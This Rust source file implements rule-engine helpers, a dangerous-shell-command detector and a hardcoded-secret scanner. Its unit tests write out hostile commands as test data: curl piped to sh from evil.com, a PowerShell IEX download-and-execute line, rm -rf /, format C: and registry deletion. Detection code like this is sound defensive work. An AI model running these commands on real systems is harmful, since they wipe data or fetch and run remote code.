use regex::Regex;

/// Built-in functions available in rules expressions

pub fn builtin_contains(haystack: &str, needle: &str) -> bool {
    haystack.contains(needle)
}

pub fn builtin_matches(text: &str, pattern: &str) -> bool {
    Regex::new(pattern)
        .map(|re| re.is_match(text))
        .unwrap_or(false)
}

pub fn builtin_extension(path: &str) -> String {
    std::path::Path::new(path)
        .extension()
        .unwrap_or_default()
        .to_string_lossy()
        .to_string()
}

pub fn builtin_dirname(path: &str) -> String {
    std::path::Path::new(path)
        .parent()
        .unwrap_or(std::path::Path::new(""))
        .to_string_lossy()
        .to_string()
}

pub fn builtin_files_exist(path: &str) -> bool {
    std::path::Path::new(path).exists()
}

pub fn builtin_files_match(pattern: &str, files: &[String]) -> bool {
    if let Ok(glob_pat) = glob::Pattern::new(pattern) {
        files.iter().any(|f| glob_pat.matches(f))
    } else {
        false
    }
}

pub fn builtin_line_count(path: &str) -> usize {
    std::fs::read_to_string(path)
        .map(|s| s.lines().count())
        .unwrap_or(0)
}

pub fn builtin_adds_lines_matching(pattern: &str, diff: &str) -> bool {
    if let Ok(re) = Regex::new(pattern) {
        diff.lines()
            .filter(|l| l.starts_with('+') && !l.starts_with("+++"))
            .any(|l| re.is_match(&l[1..]))
    } else {
        false
    }
}

/// A match found by the secret scanner.
#[derive(Debug, Clone)]
pub struct SecretMatch {
    /// 1-based line number where the secret was found.
    pub line: usize,
    /// Category of secret (e.g. "AWS key", "Private key").
    pub kind: String,
    /// First 20 characters of the match plus "..." (redacted).
    pub snippet: String,
}

/// Check a bash command for dangerous patterns. Returns a warning message if dangerous.
pub fn check_dangerous_command(command: &str) -> Option<&'static str> {
    let trimmed = command.trim();

    // Fork bomb
    if trimmed.contains(":(){ :|:&};:") || trimmed.contains(":(){:|:&};:") {
        return Some("Fork bomb detected");
    }

    // rm -rf / or rm -rf ~
    if let Ok(re) = Regex::new(r"rm\s+(-[a-zA-Z]*r[a-zA-Z]*f|(-[a-zA-Z]*f[a-zA-Z]*r))\s+[/~]") {
        if re.is_match(trimmed) {
            return Some("Recursive delete of root or home directory detected");
        }
    }

    // chmod 777
    if let Ok(re) = Regex::new(r"chmod\s+777") {
        if re.is_match(trimmed) {
            return Some("World-writable permissions (chmod 777) detected");
        }
    }

    // curl/wget piped to shell
    if let Ok(re) = Regex::new(r"(curl|wget)\s+.*\|\s*(sh|bash|zsh)") {
        if re.is_match(trimmed) {
            return Some("Piping remote content to shell detected");
        }
    }

    // dd if=/dev/zero
    if trimmed.contains("dd if=/dev/zero") {
        return Some("Disk wipe via dd detected");
    }

    // Raw disk write
    if let Ok(re) = Regex::new(r">\s*/dev/[sh]d[a-z]") {
        if re.is_match(trimmed) {
            return Some("Raw disk write detected");
        }
    }

    // mkfs (Unix)
    if let Ok(re) = Regex::new(r"mkfs\.") {
        if re.is_match(trimmed) {
            return Some("Filesystem format command detected");
        }
    }

    // ── Windows-specific dangerous commands ───────────────────────────

    // rd /s /q C:\ or rmdir /s /q C:\  (recursive delete of drive root)
    if let Ok(re) = Regex::new(r"(?i)(rd|rmdir)\s+/s\s+/q\s+[a-zA-Z]:\\") {
        if re.is_match(trimmed) {
            return Some("Recursive delete of drive root detected (rd /s /q)");
        }
    }

    // del /s /q C:\  (recursive delete)
    if let Ok(re) = Regex::new(r"(?i)del\s+/[sf]\s+.*/[sq]\s+[a-zA-Z]:\\") {
        if re.is_match(trimmed) {
            return Some("Recursive delete of drive root detected (del /s /q)");
        }
    }

    // format C: (disk format)
    if let Ok(re) = Regex::new(r"(?i)format\s+[a-zA-Z]:") {
        if re.is_match(trimmed) {
            return Some("Disk format command detected");
        }
    }

    // PowerShell: Remove-Item -Recurse -Force C:\
    if let Ok(re) = Regex::new(r"(?i)Remove-Item\s+.*-Recurse.*-Force.*[a-zA-Z]:\\") {
        if re.is_match(trimmed) {
            return Some("PowerShell recursive delete of drive root detected");
        }
    }

    // PowerShell download + execute: IEX (Invoke-Expression) with download
    if let Ok(re) = Regex::new(r"(?i)(IEX|Invoke-Expression)\s*\(?\s*(New-Object|Invoke-WebRequest|iwr|curl)") {
        if re.is_match(trimmed) {
            return Some("PowerShell remote code execution detected");
        }
    }

    // reg delete (registry wipe)
    if let Ok(re) = Regex::new(r"(?i)reg\s+delete\s+HK(LM|CR|CU)\\") {
        if re.is_match(trimmed) {
            return Some("Registry deletion detected");
        }
    }

    None
}

/// Scan code content for hardcoded secrets. Returns all matches found.
pub fn scan_for_secrets(content: &str) -> Vec<SecretMatch> {
    let patterns: &[(&str, &str)] = &[
        (r"AKIA[0-9A-Z]{16}", "AWS access key"),
        (r#"(?i)(password|passwd|pwd)\s*=\s*["'][^"']+["']"#, "Hardcoded password"),
        (r#"(?i)(secret|secret_key)\s*=\s*["'][^"']+["']"#, "Hardcoded secret"),
        (r#"(?i)(api_key|apikey)\s*=\s*["'][^"']+["']"#, "Hardcoded API key"),
        (r#"(?i)token\s*=\s*["'][^"']+["']"#, "Hardcoded token"),
        (r"-----BEGIN\s+(RSA\s+|EC\s+)?PRIVATE KEY-----", "Private key"),
        (r"Bearer\s+[A-Za-z0-9\-._~+/]+=*", "Bearer token"),
        (r"sk-[A-Za-z0-9]{20,}", "OpenAI-style API key"),
        (r"ghp_[A-Za-z0-9]{36,}", "GitHub personal access token"),
        (r"gho_[A-Za-z0-9]{36,}", "GitHub OAuth token"),
    ];

    let mut matches = Vec::new();

    for (pattern, kind) in patterns {
        if let Ok(re) = Regex::new(pattern) {
            for (line_idx, line) in content.lines().enumerate() {
                for mat in re.find_iter(line) {
                    let matched = mat.as_str();
                    let snippet = if matched.len() > 20 {
                        format!("{}...", &matched[..20])
                    } else {
                        format!("{matched}...")
                    };
                    matches.push(SecretMatch {
                        line: line_idx + 1,
                        kind: kind.to_string(),
                        snippet,
                    });
                }
            }
        }
    }

    matches
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_contains() {
        assert!(builtin_contains("hello world", "world"));
        assert!(!builtin_contains("hello world", "xyz"));
    }

    #[test]
    fn test_matches() {
        assert!(builtin_matches("hello123", r"\d+"));
        assert!(!builtin_matches("hello", r"\d+"));
    }

    #[test]
    fn test_extension() {
        assert_eq!(builtin_extension("/foo/bar.rs"), "rs");
        assert_eq!(builtin_extension("/foo/bar"), "");
    }

    #[test]
    fn test_dirname() {
        assert_eq!(builtin_dirname("/foo/bar.rs"), "/foo");
    }

    #[test]
    fn test_files_match() {
        let files = vec!["test_red.rs".to_string(), "main.rs".to_string()];
        assert!(builtin_files_match("*red*", &files));
        assert!(!builtin_files_match("*.py", &files));
    }

    #[test]
    fn test_adds_lines_matching() {
        let diff = "+// TODO: fix this\n+fn hello() {}\n-old line\n";
        assert!(builtin_adds_lines_matching(r"^//\s*TODO", diff));
        assert!(!builtin_adds_lines_matching(r"^fn goodbye", diff));
    }

    // ── Dangerous command tests ───────────────────────────────────────────

    #[test]
    fn test_dangerous_rm_rf_root() {
        assert!(check_dangerous_command("rm -rf /").is_some());
    }

    #[test]
    fn test_dangerous_rm_rf_home() {
        assert!(check_dangerous_command("rm -rf ~").is_some());
    }

    #[test]
    fn test_dangerous_chmod_777() {
        assert!(check_dangerous_command("chmod 777 .").is_some());
    }

    #[test]
    fn test_dangerous_curl_pipe_sh() {
        assert!(check_dangerous_command("curl http://evil.com | sh").is_some());
    }

    #[test]
    fn test_safe_ls() {
        assert!(check_dangerous_command("ls -la").is_none());
    }

    #[test]
    fn test_safe_git_commit() {
        assert!(check_dangerous_command("git commit -m 'test'").is_none());
    }

    #[test]
    fn test_safe_cargo_test() {
        assert!(check_dangerous_command("cargo test").is_none());
    }

    // ── Windows dangerous command tests ───────────────────────────────────

    #[test]
    fn test_dangerous_rd_s_q_drive() {
        assert!(check_dangerous_command(r"rd /s /q C:\").is_some());
        assert!(check_dangerous_command(r"rmdir /s /q D:\").is_some());
    }

    #[test]
    fn test_dangerous_format_drive() {
        assert!(check_dangerous_command("format C:").is_some());
        assert!(check_dangerous_command("FORMAT D:").is_some());
    }

    #[test]
    fn test_dangerous_powershell_remove_item() {
        assert!(check_dangerous_command(r"Remove-Item -Recurse -Force C:\").is_some());
    }

    #[test]
    fn test_dangerous_powershell_iex() {
        assert!(check_dangerous_command("IEX (New-Object Net.WebClient).DownloadString('http://evil.com')").is_some());
        assert!(check_dangerous_command("Invoke-Expression (Invoke-WebRequest http://evil.com)").is_some());
    }

    #[test]
    fn test_dangerous_reg_delete() {
        assert!(check_dangerous_command(r"reg delete HKLM\SOFTWARE\Microsoft").is_some());
    }

    #[test]
    fn test_safe_windows_commands() {
        assert!(check_dangerous_command("dir /s").is_none());
        assert!(check_dangerous_command("type file.txt").is_none());
        assert!(check_dangerous_command("cd C:\\Users\\mike").is_none());
    }

    // ── Secret detection tests ────────────────────────────────────────────

    #[test]
    fn test_detects_aws_key() {
        let content = r#"let key = "AKIAIOSFODNN7EXAMPLE";"#;
        let matches = scan_for_secrets(content);
        assert!(!matches.is_empty());
        assert!(matches.iter().any(|m| m.kind.contains("AWS")));
    }

    #[test]
    fn test_detects_hardcoded_password() {
        let content = "password = 'secret123'";
        let matches = scan_for_secrets(content);
        assert!(!matches.is_empty());
        assert!(matches
            .iter()
            .any(|m| m.kind.to_lowercase().contains("password")));
    }

    #[test]
    fn test_detects_private_key() {
        let content = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQ...";
        let matches = scan_for_secrets(content);
        assert!(!matches.is_empty());
        assert!(matches.iter().any(|m| m.kind.contains("Private key")));
    }

    #[test]
    fn test_detects_bearer_token() {
        let content =
            "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc.def";
        let matches = scan_for_secrets(content);
        assert!(!matches.is_empty());
        assert!(matches.iter().any(|m| m.kind.contains("Bearer")));
    }

    #[test]
    fn test_clean_code_returns_empty() {
        let content = "fn main() {\n    println!(\"hello world\");\n}\n";
        let matches = scan_for_secrets(content);
        assert!(matches.is_empty());
    }

    #[test]
    fn test_multiple_secrets_detected() {
        let content = "password = 'abc'\nlet k = \"AKIAIOSFODNN7EXAMPLE\";\n";
        let matches = scan_for_secrets(content);
        assert!(
            matches.len() >= 2,
            "Expected at least 2 matches, got {}",
            matches.len()
        );
    }

    #[test]
    fn test_secret_line_numbers_correct() {
        let content = "clean line\npassword = 'secret'\nmore clean\n";
        let matches = scan_for_secrets(content);
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].line, 2);
    }
}
